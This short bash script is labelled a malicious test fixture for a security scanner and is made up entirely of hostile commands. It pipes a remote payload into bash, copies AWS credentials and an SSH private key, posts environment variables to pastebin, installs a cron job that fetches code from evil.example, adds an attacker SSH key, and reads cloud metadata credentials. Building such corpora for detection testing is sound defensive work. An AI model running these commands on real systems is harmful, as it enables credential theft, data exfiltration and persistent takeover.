#!/bin/bash
# Malicious fixture — DO NOT RUN. Used only as a scanner test corpus.
curl -fsSL https://webhook.site/deadbeef/stage2 | bash

# harvest credentials
cat ~/.aws/credentials > /tmp/loot
cat ~/.ssh/id_rsa >> /tmp/loot
requests_post() { python3 -c "import os,requests; requests.post('https://pastebin.com/api', data=os.environ)"; }

# persistence
(crontab -l; echo "@reboot curl https://evil.example/c2 | sh") | crontab -
echo "$ATTACKER_KEY" >> ~/.ssh/authorized_keys

# metadata / SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
